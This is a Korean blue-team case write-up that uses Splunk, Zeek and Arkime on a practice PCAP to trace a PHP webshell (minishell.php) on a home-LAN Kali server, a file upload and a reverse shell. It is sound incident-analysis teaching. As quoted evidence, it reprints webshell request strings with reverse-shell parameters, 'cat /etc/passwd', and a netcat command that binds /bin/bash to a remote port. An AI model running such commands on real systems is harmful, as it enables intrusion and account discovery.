---
title: Witty server — Splunk 중심 베이스라이닝에서 가정집 LAN 안의 PHP 웹셸(minishell.php), 파일 업로드, 리버스 셸까지
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - webshell
  - reverse-shell
  - linux
---

# Witty server — 가정집 LAN 안의 PHP 웹셸, 파일 업로드, 리버스 셸 { #wittyserver }

!!! abstract "사례 요약"
    **가정집 네트워크**(192.168.1.0/24, 도메인 없음)의 5분짜리 연습 PCAP을 **Splunk 중심**으로, 패킷 내용은 Arkime로 분석한 기록이에요. 이건 **악성코드 감염이 아니에요.** 윈도우 10 PC(**192.168.1.102**)가 Kali Linux 웹 서버(**wittyserver, 192.168.1.100**, 포트 **55555**의 Apache)에 이미 올라가 있던 PHP **웹셸 `minishell.php`**를 조작해요. 웹셸로 `cerber4.PNG`를 `/tmp`에 올리고, `cat /etc/passwd`를 실행하고, **PHP 리버스 셸**을 시작해요. 192.168.1.102:4444로 보낸 처음 두 번은 실패하고, 세 번째인 **192.168.1.101:4444**는 성공해서 **www-data** 권한의 셸을 2분 동안 쥐어요. 인터넷 쪽 연결이 대부분 비어 보이는 이유(한 방향 캡처), 외부 사이트의 이미지가 C2가 **아닌** 이유, 초기 침투가 안 보이는 이유도 함께 다뤄요.

| | |
|---|---|
| **증거** | 연습용 PCAP, 2017-01-20 09:53:28 – 09:58:40 UTC (약 5분). 출처 기록 없음 |
| **환경** | 폐쇄망. Zeek 로그가 들어간 Splunk(`index=zeek`)와 Arkime, **이 PCAP만 들어 있음**(케이스 필드나 태그 필요 없음). **Wireshark 사용 안 함.** |
| **결과물** | 분석, Snort 룰 하나 |
| **관련 페이지** | [BEGUILESOFT — FTP로 유출한 HawkEye](beguilesoft-hawkeye-ftp-exfil.md)(같은 베이스라이닝 방법) · [플레이북: 웹셸/서버](../playbooks/webshell-server.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Zeek conn.log](../../network/zeek/conn-log.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) |

!!! tip "이 페이지 읽는 법"
    분석한 순서 그대로예요. **베이스라이닝 → 이상한 점 → HTTP → 연결과 파일 → Arkime로 내용 → 초기 침투 → Snort**. 새로 나오는 SPL 명령과 필드는 처음 나올 때 설명해요. **질문** 상자는 분석하면서 실제로 나온 질문과 답이에요.

!!! warning "이 페이지의 지표는 실제 값입니다"
    도메인과 IP는 실제 캡처에서 나온 값이에요. 본문과 표에서는 무력화(`[.]`)했고, 코드 블록 안은 입력한 그대로 두었어요. **절대 접속하지 마세요.**

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 네트워크 | 가정집 LAN 192.168.1.0/24, 공유기 192.168.1.1, 통신사 DNS 75.75.75.75 / 75.75.76.76 (Comcast). DHCP 없음, 도메인 없음 | 확인 |
| 피해 시스템 | **192.168.1.100 wittyserver**, Kali Linux, 포트 55555의 Apache/2.4.18, MAC `6c:0b:84:6a:1d:d8` | 확인 |
| 웹셸 조작자 | **192.168.1.102**, 윈도우 10, Chrome 55, MAC `90:e6:ba:96:43:32` (ASUSTek), 호스트명 RY4WN-PC 가능성 | 확인(호스트명은 추정) |
| 리버스 셸 수신 | **192.168.1.101**, 포트 4444 (22번 SSH도 돌고 있음) | 확인 |
| 웹셸 | `/minishell.php`, 로그인 쿠키 `user=ry4wn`, pass = `password`의 MD5 | 확인 |
| 한 일 | `cerber4.PNG`(진짜 PNG)를 `/tmp`에 업로드, `cat /etc/passwd`, 리버스 셸, `ls`, `id`, `cd /tmp`, `nc -nv 192.168.1.100 5555 -e /bin/bash` | 확인 |
| 리버스 셸 | .102:4444 → 실패(S0), **.101:4444 → 성공**, 120초, `www-data` 권한 | 확인 |
| root 권한 | 보이지 않음 | 확인(캡처 범위 안) |
| 초기 침투 | 캡처에 없음 — `minishell.php`가 이미 서버에 있었음 | 확인(흔적 없음) |

---

## 0단계 — 첫 쿼리 전에 { #prep }

이 PCAP 데이터만 들어 있어서, 다른 케이스에서 쓰던 `pcap_case` 조건은 **필요 없어요.** `index=zeek`만 쓰면 이 케이스예요. Arkime도 `tags ==` 조건 없이 검색하면 돼요.

- **시간 범위 = All time** (데이터가 2017년이라서).
- **Splunk 시간대 = UTC** (`strftime`이 UTC로 나오게).

---

## 1단계 — 베이스라이닝 { #baseline }

[BEGUILESOFT 케이스](beguilesoft-hawkeye-ftp-exfil.md#baseline)와 같은 쿼리 6개를 `pcap_case`만 빼고 써요. 한 줄씩 설명은 그쪽에 있고, 여기서는 새로 나온 것만 설명해요.

### 1-1. 캡처 시간과 로그 종류 { #log-types }

```spl
index=zeek
| stats count AS events min(ts) AS first max(ts) AS last BY sourcetype
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
| sort - events
```

```text
sourcetype          events  first                last
zeek:conn           192     2017-01-20 09:53:28  2017-01-20 09:58:40
zeek:weird          96      2017-01-20 09:53:32  2017-01-20 09:58:40
zeek:dns            43      2017-01-20 09:53:31  2017-01-20 09:58:40
zeek:http           42      2017-01-20 09:53:35  2017-01-20 09:58:35
zeek:files          32      2017-01-20 09:53:35  2017-01-20 09:58:35
zeek:ssl            5       2017-01-20 09:54:18  2017-01-20 09:58:40
zeek:packet_filter  1       2026-11-23 12:22:18  2026-11-23 12:22:18
```

- 캡처 시간은 **09:53:28 – 09:58:40 UTC, 약 5분**이에요.
- `zeek:packet_filter`는 Zeek이 처리를 시작할 때 남긴 기록이라 날짜가 오늘이에요. 패킷 시간이 아니니 무시해요.
- **`zeek:weird`가 96건**이에요. Zeek이 뭔가 이상한 걸 봤다는 신호예요. [2단계](#weird)에서 확인해요.

### 1-2. DHCP와 Kerberos { #dhcp-kerberos }

```spl
index=zeek sourcetype=zeek:dhcp
| eval time=strftime(ts, "%Y-%m-%d %H:%M:%S")
| table time client_addr assigned_addr mac host_name domain msg_types
```

```spl
index=zeek sourcetype=zeek:kerberos
| stats count BY id_orig_h id_resp_h client
```

- 이번에 추가한 `client_addr`는 요청을 보낸 PC의 현재 IP예요. `assigned_addr`가 빌 때(DHCP INFORM) 유용해요.
- **둘 다 "No results found."**예요. 5분 동안 DHCP가 없었고(주소가 이미 정해져 있었음), **Kerberos가 없으니 윈도우 도메인도 없어요.**

### 1-3. 내부 호스트 { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn
| where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h)
| stats count AS conns dc(id_resp_h) AS dests BY id_orig_h
| sort - conns
```

```text
id_orig_h       conns  dests
192.168.1.102   184    51
192.168.1.100   8      2
```

- **192.168.1.102**가 거의 모든 연결을 시작해요(연결 184개, 목적지 51개). 주 PC예요.
- **192.168.1.100**은 8개, 목적지 2개뿐이에요. 기억해 두세요. 서버가 먼저 연결을 시작하는 건 나중에 확인해요.

### 1-4. 목적지와 DNS { #destinations }

```spl
index=zeek sourcetype=zeek:conn
| stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
| where NOT cidrmatch("192.168.0.0/16", id_resp_h)
```

- **새로 나온 `where NOT cidrmatch(...)`**: `NOT`은 조건을 뒤집어요. 목적지가 192.168.0.0/16이 **아닌** 줄만 남겨서 외부 목적지만 봐요. 내부 대역에 맞게 바꿔 쓰면 돼요.

53줄 중 눈여겨볼 줄:

```text
id_resp_h        id_resp_p  service  conns  sent     recv  first
52.3.222.186     9339       -        1      2227     0     09:53:30
75.75.75.75      53         dns      11                    09:53:39
75.75.76.76      53         dns      3                     09:53:39
82.98.86.178     80         http     14     5543     0     09:53:39
255.255.255.255  17500      -        1      5852     0     09:53:41
74.125.192.125   5222       -        1      583      0     09:53:46
173.192.194.69   5938       -        1      144      0     09:54:08
94.31.29.54      80         -        1                     09:54:16
239.255.255.250  1900       -        4      2898     0     09:54:31
165.254.162.243  8253       -        1                     09:57:49
8.23.224.125     80         http     1      245      0     09:57:49
... recv 0인 Google / Microsoft / CDN 443·80 줄 수십 개 ...
```

```spl
index=zeek sourcetype=zeek:dns
| stats count values(answers) AS answers min(ts) AS first BY query
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

```text
query                             count  answers  first
WPAD                              15     -        09:53:31
wpad                              12     -        09:53:31
www.ajithkp560.aaaaaaaa.com       4      -        09:53:39
code.jquery.com                   1      -        09:53:47
service.weather.microsoft.com     1      -        09:54:18
ry4wn-pc                          2      -        09:54:41
clients1.google.com               1      -        09:55:32
safebrowsing-cache.google.com     1      -        09:56:20
dynupdate.noip.com                1      -        09:57:49
ipcast1.dynupdate.noip.com        1      -        09:57:49
clients2.google.com               2      -        09:58:32
settings-win.data.microsoft.com   1      -        09:58:40
v10.vortex-win.data.microsoft.com 1      -        09:58:40
```

**베이스라인 읽기:**

- **가정집 네트워크예요.** 내부 대역이 192.168.1.0/24이고, DNS 서버 **75.75.75.75 / 75.75.76.76은 미국 Comcast**(가정용 인터넷)의 DNS예요. DHCP와 Kerberos가 없는 것도 도메인 없는 가정집이라 그래요. 그래서 찾을 사용자 계정이 없어요.
- **`ry4wn-pc`**는 호스트명 후보예요(LAN에서 물어본 이름). 아직 확정은 아니에요.
- **정상 배경 트래픽:** 17500은 Dropbox LAN 동기화, 1900은 SSDP, 5355/WPAD는 LLMNR과 프록시 자동 찾기, 5222/5228은 Google 푸시예요. Google/Microsoft 443도 많아요.
- **이상한 점 두 가지:** 거의 모든 외부 연결이 **recv 0**이고, **DNS 응답이 전부 비어 있어요.**
- **볼 만한 후보:**
    - 09:53:39 `www.ajithkp560.aaaaaaaa[.]com` — 같은 초에 82.98.86.178로 HTTP 연결이 14개 생겨요.
    - 09:57:49 `dynupdate.noip[.]com` → 8.23.224.125 HTTP. No-IP는 **동적 DNS** 서비스인데, njRAT 같은 원격제어 악성코드가 자기 주소를 갱신할 때 많이 써요. 같은 초에 165.254.162.243:**8253**도 있어요.
    - 09:53:30 52.3.222.186:**9339** — 흔하지 않은 포트예요.
    - 173.192.194.69:**5938** — **TeamViewer** 포트예요. 정상일 수도 있지만 확인해요.

---

## 2단계 — 응답이 왜 비어 있나? weird 로그 { #weird }

```spl
index=zeek sourcetype=zeek:weird
| stats count BY name
| sort - count
```

`zeek:weird`는 Zeek이 프로토콜 규칙에 안 맞는 이상한 패킷을 봤을 때 남기는 로그예요. `name`이 이상 현상의 이름이에요.

```text
name                     count
possible_split_routing   41
data_before_established  40
inappropriate_FIN        15
```

- **`possible_split_routing`**과 **`data_before_established`**는 Zeek이 많은 연결의 **한쪽 방향만** 봤다는 뜻이에요(예: 3-way handshake 없이 데이터만). **`inappropriate_FIN`**도 같은 원인이에요.
- 그런데 HTTP 로그([3단계](#http))를 보면 192.168.1.100과의 통신에는 **응답이 있어요**(200, `text/html`). 그러니까 **LAN 안의 통신은 양방향이 다 있고, 인터넷 쪽은 나가는 패킷만** 캡처된 거예요. recv 0과 빈 DNS 응답은 이것 때문이에요. 캡처 위치의 특성이지 악성 행위가 아니에요.

!!! note "왜 중요한가요"
    이걸 확인하지 않으면 82.98.86.178로 "보냄 5,543, 받음 0"을 데이터 유출로 잘못 읽을 수 있어요. 바이트 수를 읽기 전에 캡처가 양방향을 다 봤는지부터 확인하세요.

---

## 3단계 — HTTP: 웹셸 { #http }

```spl
index=zeek sourcetype=zeek:http
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
```

- **`sort ts`를 `eval` 앞에 둬서** 시간순으로 먼저 정렬했어요.
- `method`는 GET/POST, `host`는 접속한 도메인, `uri`는 경로, `status_code`는 200·302·404 같은 응답 코드예요. `user_agent`는 요청한 프로그램(브라우저인지, 악성코드인지), `referrer`는 어느 페이지에서 왔는지, `resp_mime_types`는 Zeek이 응답 내용을 보고 판단한 종류예요. 응답이 캡처에 없으면 `status_code`와 `resp_mime_types`가 비어 있어요.

결과(42줄, 줄였어요. 브라우저 요청은 모두 같은 Chrome 55 / 윈도우 10 User-Agent예요):

```text
time      id_resp_h      method     uri                                                          status  referrer                                         mime
09:53:35  192.168.1.100  GET        /                                                            200     -                                                text/html
09:53:35  192.168.1.100  GET        /icons/blank.gif  (+ unknown, compressed, hand.right, folder, text, tar .gif)  200  http://192.168.1.100:55555/  image/gif
09:53:35  192.168.1.100  GET        /favicon.ico                                                 404     http://192.168.1.100:55555/                     text/html
09:53:39  192.168.1.100  GET        /minishell.php                                               200     http://192.168.1.100:55555/                     text/plain
09:53:39  82.98.86.178   GET        /images/background.gif                                       -       http://192.168.1.100:55555/minishell.php        -
09:53:47  192.168.1.100  POST       /minishell.php                                               200     .../minishell.php                               text/plain
09:53:47  94.31.29.54    GET        /jquery-latest.js                                            -       .../minishell.php                               -
09:54:16  192.168.1.100  POST       /minishell.php                                               200     .../minishell.php                               text/plain
09:54:18  192.168.1.100  GET        /minishell.php?                                              200     .../minishell.php                               text/plain
09:54:29  192.168.1.100  GET        /minishell.php?path=/var/www/html                            200     .../minishell.php?                              text/plain
09:54:38  192.168.1.100  GET        /minishell.php?path=/tmp                                     200     .../minishell.php?path=%2Fvar%2Fwww%2Fhtml
09:54:47  192.168.1.100  POST       /minishell.php?path=/tmp                                     200     .../minishell.php?path=%2Ftmp
09:54:49  192.168.1.100  GET        /minishell.php?                                              200     .../minishell.php?path=%2Ftmp
09:55:04  192.168.1.100  GET        /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd     200     .../minishell.php?
09:55:21  192.168.1.100  GET        /minishell.php?path=/var/www/html&forbd_dir                  200     ...&cmdexe=cat+%2Fetc%2Fpasswd
09:55:23  192.168.1.100  GET        /minishell.php?                                              200     ...&forbd_dir
09:55:28  192.168.1.100  GET        /minishell.php?cookiejack                                    200     .../minishell.php?
09:55:32  192.168.1.100  GET        /minishell.php?rs                                            200     .../minishell.php?cookiejack
09:55:32  192.168.1.1    SUBSCRIBE  /upnp/event/WANCommonIFC1   (UA Microsoft-Windows/10.0 UPnP/1.0)   -
09:56:05  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.102&my_port=4444   200   .../minishell.php?rs
09:56:27  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.102&my_port=4444   200   .../minishell.php?rs
09:56:35  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.101&my_port=4444   200   .../minishell.php?rs
09:57:49  8.23.224.125   GET        /settings.php?username=...&pass=HMAC{...}   (UA DUC v4.1.1/6.2.9200.0/en-US/Service)   -
09:58:35  82.98.86.178   GET        /images/background.gif                                       -       ...&my_ip=192.168.1.101&my_port=4444
```

(웹셸 페이지마다 82.98.86.178로 `GET /images/background.gif`가 하나씩 더 있어요. 위에서는 대부분 뺐어요.)

**결과 읽기:**

192.168.1.102(윈도우 10, Chrome 55)가 192.168.1.100:**55555**의 웹 서버에 접속해서 **PHP 웹셸**을 조작하고 있어요. 웹셸은 웹 서버에 몰래 올려 두고 브라우저로 서버를 원격 조종하는 PHP 파일이에요. `/var/www/html`, `/etc/passwd` 같은 경로가 나오니 .100은 **Linux 웹 서버**예요. URL의 `%2F`는 `/`, `+`는 공백이에요.

```text
09:53:35  GET /                       ← 디렉터리 목록 페이지 (icons/*.gif = Apache 기본 목록)
09:53:39  GET /minishell.php          ← 웹셸 열기
09:53:47  POST /minishell.php         ← 아마 웹셸 비밀번호 로그인
09:54:29  ?path=/var/www/html         ← 웹 폴더 둘러보기
09:54:38  ?path=/tmp                  ← /tmp 폴더 보기
09:54:47  POST ?path=/tmp             ← /tmp에 파일 업로드 가능성 ★
09:55:04  ?cmdexe=cat /etc/passwd     ← 서버에서 명령 실행 (계정 목록 읽기) ★
09:55:21  ?forbd_dir                  ← 웹셸 기능 메뉴
09:55:28  ?cookiejack                 ← 쿠키 탈취 기능 메뉴
09:55:32  ?rs                         ← 리버스 셸 메뉴
09:56:05  rev_option=PHP Reverse Shell&my_ip=192.168.1.102&my_port=4444  ★
09:56:27  (같은 요청 반복)
09:56:35  rev_option=PHP Reverse Shell&my_ip=192.168.1.101&my_port=4444  ★
```

마지막 세 줄이 가장 중요해요. **리버스 셸**은 서버(.100)가 공격자 쪽(.102 또는 .101)의 4444 포트로 **먼저 접속해 오게** 만드는 방법이에요. 성공하면 공격자는 브라우저가 아니라 진짜 명령창(셸)으로 서버를 조종해요. .102로 두 번 시도하고, 그다음에는 **192.168.1.101**로 바꿨어요. 101은 캡처에 거의 안 보이는 또 다른 내부 호스트예요.

**82.98.86.178은 C2가 아니에요.** 웹셸 페이지마다 `/images/background.gif`를 82.98.86.178(`www.ajithkp560.aaaaaaaa[.]com`)에서, `jquery-latest.js`를 94.31.29.54(`code.jquery[.]com`)에서 불러와요. Referer가 전부 `minishell.php`라서, 이건 웹셸 페이지 안에 박힌 **리소스**예요. 배경 이미지는 웹셸 제작자의 사이트에서 오는 거고, 명령이 오가지 않아요. 보고서에는 "웹셸 화면이 불러온 외부 리소스" 정도로만 적어요. 그래도 탐지 단서로는 좋아요.

**그 밖에:**

- 09:57:49 `dynupdate.noip[.]com` 요청의 User-Agent가 `DUC v4.1.1 ... Service`예요. **No-IP 동적 DNS 업데이트 프로그램**이 .102에 서비스로 설치돼 있다는 뜻이에요. 집 인터넷 IP가 바뀌어도 도메인으로 접속할 수 있게 해 주는 정상 프로그램이지만, 공격자가 리스너를 열어 둘 때도 자주 써요. 09:54:08 173.192.194.69:5938(TeamViewer)과 함께, 누가 .102를 원격으로 조종하고 있었는지 확인해 볼 만해요. 다만 둘 다 웹셸 공격과 이어지는 증거는 없어요.
- `host` 칸이 전부 **"workstation"**으로 나와요. 여기서는 HTTP Host 헤더가 아니라 Splunk가 붙인 호스트 값이라서, 도메인 이름은 DNS나 Arkime에서 봐요.

!!! question "질문: cmd.exe는 어디서 나온 거죠?"
    `cmd.exe`가 아니라 **`cmdexe`**예요. 점이 없어요. 윈도우의 명령 프롬프트(cmd.exe)와는 관계없어요.

    09:55:04 요청 URI에 들어 있던 글자예요.

    ```text
    GET /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd
    ```

    URL에서 `?` 뒤는 **쿼리 문자열**이에요. `이름=값` 쌍이 `&`로 이어져 있어요. 이 요청에는 두 쌍이 있어요.

    - `path=/var/www/html` → 웹셸이 보여 줄 폴더
    - `cmdexe=cat+/etc/passwd` → 서버에서 실행할 명령 (`+`는 공백이라서 `cat /etc/passwd`)

    **`cmdexe`라는 이름은 minishell.php 웹셸을 만든 사람이 정한 변수 이름**이에요. "command execute"를 줄인 거예요. 웹셸 화면에 명령 입력칸이 있고, 공격자가 거기에 `cat /etc/passwd`를 치면 브라우저가 그 값을 `cmdexe=`라는 이름으로 서버에 보내요. 서버의 PHP 코드는 이 값을 받아서 Linux 셸에서 실행해요.

    Arkime 화면에서도 확인돼요. 09:55:04 세션의 HTTP 칸에 **QS Keys: `path` `cmdexe`**라고 나와요. QS(Query String) Keys는 URL에 들어 있던 변수 이름 목록이에요.

    그리고 이 서버는 윈도우가 아니에요. 응답 헤더가 `Server: Apache/2.4.18 (Debian)`이고, 리버스 셸 화면에도 `Linux wittyserver 4.3.0-kali1-amd64`가 나와요. 그래서 cmd.exe는 애초에 있을 수 없어요. 실행된 명령도 `cat`, `ls`, `id` 같은 Linux 명령이에요.

---

## 4단계 — 리버스 셸은 성공했나? 무엇을 올렸나? { #connections }

### 4-1. 포트 4444(리버스 셸)와 5938(TeamViewer) { #port-4444 }

```spl
index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938)
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
```

- 괄호 안의 `OR`는 둘 중 하나라도 맞으면 가져와요.
- **새 필드 `conn_state`**는 연결 결과를 줄여 쓴 값이에요.
    - **SF** — 정상적으로 열고 닫힘(연결 성공)
    - **S0** — SYN만 보내고 **답이 없음**
    - **REJ** — 상대가 거절함(RST)
    - **OTH** — 중간부터 봐서(handshake 없음) 판단 불가
- `duration`은 연결이 몇 초 동안 유지됐는지예요.

```text
time      id_orig_h      id_orig_p  id_resp_h        id_resp_p  conn_state  orig_bytes  resp_bytes  duration
09:54:08  192.168.1.102  49729      173.192.194.69   5938       OTH         144         0           275.170322
09:56:05  192.168.1.100  39336      192.168.1.102    4444       S0          0           0           3.002945
09:56:12  192.168.1.100  39336      192.168.1.102    4444       S0
09:56:20  192.168.1.100  39336      192.168.1.102    4444       S0
09:56:27  192.168.1.100  39338      192.168.1.102    4444       S0          0           0           3.001502
09:56:34  192.168.1.100  39338      192.168.1.102    4444       S0
09:56:35  192.168.1.100  57978      192.168.1.101    4444       SF          4336        77          120.691404
09:56:42  192.168.1.100  39338      192.168.1.102    4444       S0
```

**결과 읽기:**

- **.102:4444로는 S0가 6개예요.** 서버가 SYN을 보냈는데 .102가 아무 답도 하지 않았어요. 출발지 포트가 39336, 39338 두 개뿐인 건, 같은 연결을 몇 초 간격으로 다시 시도(**재전송**)한 거라서 그래요. .102에 4444 리스너가 없었거나 윈도우 방화벽이 막은 거예요.
- **09:56:35 .101:4444는 SF예요.** HTTP 요청에서 `my_ip`를 .101로 바꾼 **바로 그 초**예요. 정상적으로 연결되고 정상적으로 끝났고, **120초** 동안 유지됐어요. .100이 보낸 게 4,336 B, .101이 보낸 게 77 B예요. 리버스 셸에서는 공격자가 짧은 명령(77 B)을 치고, 서버가 긴 결과(4,336 B)를 돌려줘요. 숫자가 딱 그 모양이에요. **공격자는 웹 서버의 셸을 2분 동안 손에 쥐었어요.**
- TeamViewer는 OTH에 받은 바이트가 0이에요. 역시 한 방향 캡처 때문이에요. 내용을 알 수 없고 웹셸과 이어지는 증거도 없어요.

### 4-2. 192.168.1.100이 시작한 연결 전부 { #server-outbound }

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
```

- `id_orig_h=192.168.1.100`처럼 `필드=값`을 검색어에 바로 쓰면, 그 값인 이벤트만 가져와요.

```text
time      id_resp_h      id_resp_p  service  conn_state  orig_bytes  resp_bytes
09:56:00  192.168.1.101  22         -        OTH         3160        8416
09:56:05  192.168.1.102  4444       -        S0          0           0
...       (위의 4444 줄들)
09:56:35  192.168.1.101  4444       -        SF          4336        77
```

연결 8개는 리버스 셸 7줄과 **.100 ↔ .101:22 SSH 연결 하나**예요(3,160 / 8,416 B, **OTH**). OTH는 Zeek이 연결의 시작(3-way handshake)을 못 봤다는 뜻이에요. 캡처는 09:53:28부터니까, 이 SSH 세션은 **캡처 시작 전에 이미 열려 있었고** 09:56:00에 처음 패킷이 오간 거예요. Zeek은 시작을 못 보면 22번 포트 쪽을 서버로 정해요. 그래서 **.101에서 SSH 서버가 돌고 있어요.** .101은 Linux 계열(공격자 머신일 가능성)로 보여요. 누가 먼저 연결했는지는 모르고, 내용은 암호화돼 있어요.

### 4-3. 서버가 받은 파일 { #files }

```spl
index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time tx_hosts rx_hosts mime_type filename seen_bytes md5
```

- `tx_hosts`는 파일을 보낸 쪽, `rx_hosts`는 받은 쪽이에요. `rx_hosts=192.168.1.100`은 서버가 **받은** 파일만 골라요.
- `mime_type`은 Zeek이 파일 내용을 보고 판단한 종류예요(`application/x-dosexec`이면 윈도우 실행 파일). `seen_bytes`는 실제로 본 크기예요.

```text
time      tx_hosts       rx_hosts       mime_type   filename     seen_bytes  md5
09:53:47  192.168.1.102  192.168.1.100  text/plain  -            49          -
09:54:16  192.168.1.102  192.168.1.100  image/png   cerber4.PNG  23125       -
09:54:16  192.168.1.102  192.168.1.100  text/plain  -            13          -
09:54:16  192.168.1.102  192.168.1.100  -           -            8           -
09:54:47  192.168.1.102  192.168.1.100  -           -            4           -
09:54:47  192.168.1.102  192.168.1.100  image/png   cerber4.PNG  23125       -
09:54:47  192.168.1.102  192.168.1.100  -           -            8           -
```

**결과 읽기:**

- **`cerber4.PNG`(23,125 B)를 두 번 올렸어요.** 09:54:16(POST `minishell.php`)과 09:54:47(POST `?path=/tmp`)이에요. **Cerber**는 랜섬웨어 이름이라서 파일 이름이 신경 쓰여요. Zeek은 파일 앞부분의 매직 바이트를 보고 `image/png`라고 판단했으니 진짜 그림일 가능성이 높아요. 예를 들어 협박 화면 이미지일 수도 있어요.
- md5가 비어 있는 건 이 Zeek 설정에 파일 해시 기능이 켜져 있지 않아서예요.
- 작은 "파일"들(49, 13, 8, 4 B)은 파일이 아니라 **POST 폼 데이터**예요. 09:53:47의 49 B는 웹셸 로그인일 가능성이 높아요.

**지금까지의 흐름:**

```text
09:53:39  .102 → .100:55555  웹셸 minishell.php 접속, 로그인
09:54:16  .102 → .100        cerber4.PNG 업로드 (1차)
09:54:47  .102 → .100        cerber4.PNG 업로드 → /tmp (2차)
09:55:04  .102 → .100        명령 실행: cat /etc/passwd
09:56:05  .100 → .102:4444   리버스 셸 시도 → 실패 (S0)
09:56:35  .100 → .101:4444   리버스 셸 → 성공 (SF, 120초)
```

---

## 5단계 — Arkime로 내용 보기 { #arkime }

리버스 셸과 웹셸은 암호화가 없어서, 명령과 결과가 그대로 보여요.

```text
ip.src == 192.168.1.100 && ip.dst == 192.168.1.101 && port.dst == 4444
ip.dst == 192.168.1.100 && http.method == POST
ip.dst == 192.168.1.100 && http.uri == *cmdexe*
```

- `http.uri == *cmdexe*`처럼 별표(`*`)로 감싸면, uri 안 **어디에든** cmdexe가 들어 있는 세션을 찾아요.

### 5-1. 리버스 셸 (.100:57978 → .101:4444) { #reverse-shell }

패킷 화면의 **Source(.100)**는 서버가 보낸 출력이고, **Destination(.101)**은 공격자가 친 명령이에요.

**연결되자마자 서버가 스스로 보낸 정보**(PHP 리버스 셸 스크립트가 접속하자마자 `uname -a`, `w`, `id`를 보내요):

```text
Linux wittyserver 4.3.0-kali1-amd64 #1 SMP Debian 4.3.3-5kali4 (2016-01-13) x86_64 GNU/Linux
 04:56:35 up 35 days, 6:27, 1 user, load average: 0.18, 0.12, 0.14
USER  TTY   FROM  LOGIN@   IDLE    JCPU   PCPU  WHAT
root  tty2  :0    15Dec16  35days  43:00m 2.15s eog /root/Pictures/13124439_..._n.jpg
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

- 호스트명은 **wittyserver**, 커널은 **Kali Linux**예요.
- 35일째 켜져 있고, **콘솔(tty2)에 root가 로그인한 상태**로 이미지 뷰어(eog)를 띄워 두고 있어요.
- 셸 권한은 **웹 서버 계정 www-data**(uid 33)예요. **root 권한은 아니에요.**
- `can't access tty; job control turned off`는 단순한 리버스 셸에서 흔히 나오는 메시지예요. 완전한 터미널이 아니라는 뜻이에요.

**공격자가 친 명령(77 B):**

```text
cat /etc/passwd                      ← 서버 계정 목록 다시 읽기
ls                                   ← 최상위 폴더 보기
id                                   ← 권한 확인 (www-data)
cd /tmp
ls                                   ← cerber4.PNG가 있음 → 업로드 성공 확인
nc -nv 192.168.1.100 5555 -e /bin/bash
exit
```

**출력 읽기:**

- `/etc/passwd`에서 일반 사용자 계정 **ry4wn**(uid 1000), **wordpress**(1001), **backups**(1002)가 보여요. mysql, postgres, couchdb, redis 같은 서비스 계정도 있어요. 공격자가 다음 목표(비밀번호 추측, 권한 상승)를 고를 때 쓰는 정보예요.
- `ls /tmp`에 **cerber4.PNG**가 있어서, 업로드가 디스크에 저장된 게 확인돼요.
- `nc -nv 192.168.1.100 5555 -e /bin/bash`는 netcat으로 192.168.1.100:5555에 접속하고 그 연결에 bash를 붙이는 명령이에요. 그런데 목적지가 **서버 자기 자신**이에요. 결과 `(UNKNOWN) [192.168.1.100] 5555 (?) open`을 보면 5555에 무언가가 열려 있었어요. 자기 자신과의 통신은 밖으로 나오지 않아서 캡처에 안 보여요. 오타인지, 다른 백도어와 연결하려 한 건지는 **호스트 확인이 필요**해요.

### 5-2. cerber4.PNG 업로드 (.102:56133 → .100:55555) { #upload }

```text
POST /minishell.php?path=%2Ftmp HTTP/1.1
Host: 192.168.1.100:55555
Content-Length: 23511
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWlmDBITBvT55SBwa
Referer: http://192.168.1.100:55555/minishell.php?path=%2Ftmp
Cookie: user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99

------WebKitFormBoundaryWlmDBITBvT55SBwa
Content-Disposition: form-data; name="path"

/tmp
------WebKitFormBoundaryWlmDBITBvT55SBwa
Content-Disposition: form-data; name="upload_f"; filename="cerber4.PNG"
Content-Type: image/png

‰PNG
IHDR ... sRGB ... gAMA ... pHYs ... IDAT ...
```

- `multipart/form-data`는 웹 페이지의 "파일 올리기" 버튼과 같은 방식이에요.
- `name="path"` → `/tmp`는 저장할 폴더, `name="upload_f"; filename="cerber4.PNG"`는 웹셸의 업로드 입력칸 이름과 파일 이름이에요.
- 본문이 `‰PNG` → `IHDR`, `sRGB`, `gAMA`, `pHYs`, `IDAT`로 이어져요. **진짜 PNG 그림 파일의 구조**예요. 실행 파일의 이름만 바꾼 게 아니에요. 그림 내용은 파일을 추출해야 알 수 있어요.

